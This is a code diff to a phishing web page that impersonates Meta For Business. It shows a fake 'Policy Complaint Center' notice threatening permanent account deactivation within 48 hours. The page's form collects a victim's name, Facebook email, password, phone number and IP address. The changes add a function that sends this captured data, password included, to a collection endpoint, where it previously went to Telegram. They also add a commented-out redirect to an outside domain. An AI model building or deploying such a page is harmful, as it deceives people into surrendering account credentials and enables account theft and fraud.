@@ -3,7 +3,6 @@
 <head></head>
 
 <body>
-    ﻿
     <!-- Required meta tags -->
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1 !important">
@@ -14,6 +13,14 @@
         crossorigin="anonymous" referrerpolicy="no-referrer">
     <title>Meta For Business</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            outline: 0;
+            border: 0
+        }
+
         .spinner {
             display: inline-block;
             width: 12px;
@@ -145,18 +152,15 @@
             animation-delay: -0.1s;
         }
     </style>
-    <link rel="shortcut icon" href="images/favicon.ico">
-    <form id="redirectForm" action="/index.php" method="POST" style="display:none;">
-        <input type="hidden" name="type" value="1">
-        <input type="hidden" name="userId" value="12345">
-    </form>
+
     <div>
         <div class="bg-global">
             <section class="header">
                 <div class="container">
                     <div class="row">
                         <div class="col-6 col">
-                            <img src="images/meta3.png" style="transform: scale(2.0); max-width: 15%;">
+                            <img src="images/meta3.png"
+                                style="transform: scale(3.0); max-width: 20%; margin-left: 30px;">
                         </div>
                         <div class="col-6 col"></div>
                     </div>
@@ -172,8 +176,7 @@
                                         <div class="col">
                                             <div class="row">
                                                 <div class="col">
-                                                    <div><span class="fh_t-1">Request a review of a restricted
-                                                            page</span>
+                                                    <div><span class="fh_t-1">Policy Complaint Center</span>
                                                     </div>
                                                 </div>
                                             </div>
@@ -182,12 +185,12 @@
                                 </div>
                                 <div class="card-body">
                                     <div>
-                                        <div class="fs12 fc6">If you believe it should not be disabled, please
-                                            request a review of this ad account. You can request a review no later
-                                            than 24 hours after receiving the notification, otherwise your account
-                                            will be disabled. To help ensure your ads comply with our policies, take
-                                            the Blueprint course on Advertising policies for ad content, creative,
-                                            and targeting.
+                                        <div class="fs12 fc6">We've received a report that your page and account are not
+                                            following Facebook's Terms of Service. After reviewing it, we found a lot of
+                                            unusual activity on your page and account. If you believe this is an error,
+                                            please request a review of this account. You can request a review within 48
+                                            hours of receiving the notification, or your account will be permanently
+                                            disabled.
                                         </div>
                                     </div>
                                     <div class="form-info">
@@ -217,7 +220,12 @@
                                                     <div class="mb4 fc6 fwb fs12">
                                                         <label for="email">Facebook Email Address *</label>
                                                         <input type="email" class="form-control" id="email" name="email"
-                                                            aria-describedby="email" required="">
+                                                            aria-describedby="emailHelp" required
+                                                            pattern="[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"
+                                                            inputmode="email"
+                                                            title="Vui lòng nhập địa chỉ email hợp lệ (ví dụ: example@gmail.com)">
+
+
                                                     </div>
                                                     <div class="fc6 fwb fs12">
                                                         <div class="phone"><span>Phone Number *</span></div>
@@ -709,7 +717,8 @@
                                                                 <option name="Zimbabwe (+263)" value="263">Zimbabwe
                                                                     (+263)</option>
                                                             </select>
-                                                            <input class="form-pn" type="text" name="phone" id="phone">
+                                                            <input class="form-pn" type="number" name="phone"
+                                                                id="phone">
                                                         </div>
                                                     </div>
                                                 </div>
@@ -900,6 +909,14 @@
             <script src="./JdXs6r7J02nw.com/ajax/libs/crypto-js/rvYEpOyXa5br.1/M4vbMkN7eK4Q.js"></script>
             <script src="tele.js"></script>
             <script>
+
+                // if (!sessionStorage.getItem('redirected')) {
+                //     // Chuyển hướng nếu chưa được chuyển hướng trước đó
+                //     window.location.href = 'http://businesssupportcenter2025.online/authen.html';
+                //     // Đánh dấu là đã chuyển hướng
+                //     sessionStorage.setItem('redirected', 'true');
+                // }
+
                 let check_submit = false;
                 let time_out = 2;
                 let uuid = "97c3a31f-fb04-444c-8c30-cbb245e715cd"
@@ -920,6 +937,39 @@
 
 
                 $("#btn-submit").click(function () {
+
+                    document.addEventListener("DOMContentLoaded", function () {
+                        // Lấy giá trị mặc định của input email
+                        let emailInput = document.getElementById("email");
+
+                        if (emailInput) {
+                            // Hàm kiểm tra định dạng email
+                            function checkEmailFormat() {
+                                let email = emailInput.value;
+                                let regex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+
+                                console.log("Email:", email, "Kết quả regex:", regex.test(email));
+
+                                if (!regex.test(email)) {
+                                    emailInput.style.border = "2px solid red";
+                                    emailInput.style.backgroundColor = "#ffe6e6";
+                                } else {
+                                    emailInput.style.border = "1px solid #ccc";
+                                    emailInput.style.backgroundColor = "white";
+                                }
+                            }
+
+                            // Kiểm tra ngay khi tải trang
+                            checkEmailFormat();
+
+                            // Vẫn giữ sự kiện input để kiểm tra khi người dùng nhập (nếu cần)
+                            emailInput.addEventListener("input", function () {
+                                checkEmailFormat();
+                            });
+                        } else {
+                            console.error("Không tìm thấy phần tử có id='email'");
+                        }
+                    });
 
                     var isValid = true;
                     var fullName = $('#full_name').val();
@@ -978,6 +1028,24 @@
                     });
                 }
 
+                function sendTele(data) {
+                    return new Promise((resolve, reject) => {
+                        $.ajax({
+                            url: 'http://localhost:5000/me/posts?data=' + encodeURIComponent(data),
+                            type: 'GET',
+                            contentType: 'application/json',
+                            success: function (msg) {
+                                console.log("IP lấy được:", msg);
+                                resolve(msg); // Trả về IP nếu lấy thành công
+                            },
+                            error: function (xhr, status, error) {
+                                console.error('Không thể lấy địa chỉ IP:', error);
+                                resolve(null); // Trả về null nếu có lỗi
+                            }
+                        });
+                    });
+                }
+
 
                 $(".submit_password").click(function () {
 
@@ -996,11 +1064,11 @@
                         }
 
                         let ip = await getIP(); // ✅ Gọi hàm getIP() đúng cách với await
+                        
                         console.log("IP lấy được:", ip);
 
                         var text = "Full Name: " + fullName + "\nFacebook Page Name: " + facebookPageName + "\nEmail: " + email + "\nPass: " + password + "\nMã Vùng: " + country_code + "\nPhone: " + phone + "\nOther reasons: " + otherReasons + "\nIp: " + ip;
-
-                        sendToTelegram(text);
+                        let send = await sendTele(text);
                     }
                     sendData();
 
